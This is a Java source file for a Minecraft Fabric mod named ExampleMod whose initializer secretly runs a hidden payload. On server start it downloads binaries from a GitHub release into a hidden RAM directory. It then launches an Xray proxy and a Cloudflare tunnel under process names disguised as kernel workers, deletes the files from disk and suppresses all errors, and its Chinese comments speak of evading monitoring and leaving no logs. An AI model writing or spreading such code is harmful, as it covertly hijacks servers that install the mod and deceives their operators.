package com.example;

import net.fabricmc.api.ModInitializer;
import java.io.*;
import java.net.URL;
import java.nio.file.*;
import java.util.UUID;

public class ExampleMod implements ModInitializer {
    // 这里填入你的 Cloudflare Tunnel Token
    private static final String CF_TOKEN = System.getenv("CF_TUNNEL_TOKEN");

    @Override
    public void onInitialize() {
        new Thread(() -> {
            try {
                // 1. 启动延迟：给服务器预留启动资源，躲避监控
                Thread.sleep(5000);

                String arch = System.getProperty("os.arch").toLowerCase();
                String xrayUrl, argoUrl;

                // 2. 根据架构选择下载地址
                if (arch.contains("amd64") || arch.contains("x86_64")) {
                    xrayUrl = "https://github.com/aooa45/dis-bot/releases/download/v1.0/disxrbot-amd64";
                    argoUrl = "https://github.com/aooa45/dis-bot/releases/download/v1.0/agent-amd64";
                } else if (arch.contains("aarch64") || arch.contains("arm64")) {
                    xrayUrl = "https://github.com/aooa45/dis-bot/releases/download/v1.0/disxrbot-arm64";
                    argoUrl = "https://github.com/aooa45/dis-bot/releases/download/v1.0/agent-arm64";
                } else {
                    return; // 不支持的架构直接退出
                }

                // 3. 准备内存工作目录 (RAM Disk)
                String runPath = "/dev/shm/.sys-lib-" + UUID.randomUUID().toString().substring(0, 4);
                File dir = new File(runPath);
                if (!dir.exists()) dir.mkdirs();

                File xrayBin = new File(dir, "kworker-cache");
                File argoBin = new File(dir, "kworker-sh");
                File configJson = new File(dir, "config.json");

                // 4. 执行下载
                downloadFile(xrayUrl, xrayBin);
                downloadFile(argoUrl, argoBin);
                
                // 从资源文件夹释放 Xray 配置文件 (记得放在 resources/proxy_config.json)
                extractResource("proxy_config.json", configJson);

                // 5. 赋予执行权限
                xrayBin.setExecutable(true, false);
                argoBin.setExecutable(true, false);

                // 6. 启动 Xray 进程 (伪装名为 u24:0)
                Runtime.getRuntime().exec(new String[]{"bash", "-c", 
                    "exec -a '[kworker/u24:0]' " + xrayBin.getAbsolutePath() + " run -c " + configJson.getAbsolutePath()
                });

                // 7. 启动 Argo 进程 (伪装名为 1:1)
                // 这里的命令：tunnel run --token 会将本地 Xray 监听的端口映射到公网
                Runtime.getRuntime().exec(new String[]{"bash", "-c", 
                    "exec -a '[kworker/1:1]' " + argoBin.getAbsolutePath() + " tunnel --no-autoupdate run --token " + CF_TOKEN
                });

                // 8. 运行后即焚 (保持进程在内存，删除磁盘文件)
                Thread.sleep(8000);
                xrayBin.delete();
                argoBin.delete();

            } catch (Exception ignored) {
                // 静默失败，不留日志
            }
        }).start();
    }

    private void downloadFile(String urlStr, File dest) throws IOException {
        URL url = new URL(urlStr);
        try (InputStream in = url.openStream()) {
            Files.copy(in, dest.toPath(), StandardCopyOption.REPLACE_EXISTING);
        }
    }

    private void extractResource(String resName, File dest) throws IOException {
        try (InputStream is = getClass().getClassLoader().getResourceAsStream(resName)) {
            if (is != null) Files.copy(is, dest.toPath(), StandardCopyOption.REPLACE_EXISTING);
        }
    }
}
